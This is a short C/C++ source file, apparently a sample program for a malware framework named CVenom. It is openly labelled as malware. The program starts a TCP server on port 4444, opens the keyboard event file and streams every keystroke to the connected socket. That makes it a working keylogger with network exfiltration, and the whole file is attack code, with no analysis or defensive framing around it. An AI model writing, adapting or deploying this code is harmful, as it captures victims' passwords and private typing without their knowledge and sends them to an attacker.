#include <CVenom.h>
#include <KeyboardTools.h>
#include <NetworkTools.h>

int main(MALWARE_ENTRY){
        cvinit(MALWARE_INIT);

        KeyboardTools Keyboard;
	NetworkTools Network;

	Network.TCPServer("*", 4444);

        Keyboard.GetEventFile();
	Keyboard.StreamKeystrokes(Network.Socket());

        cvexit(MALWARE_EXIT);
}
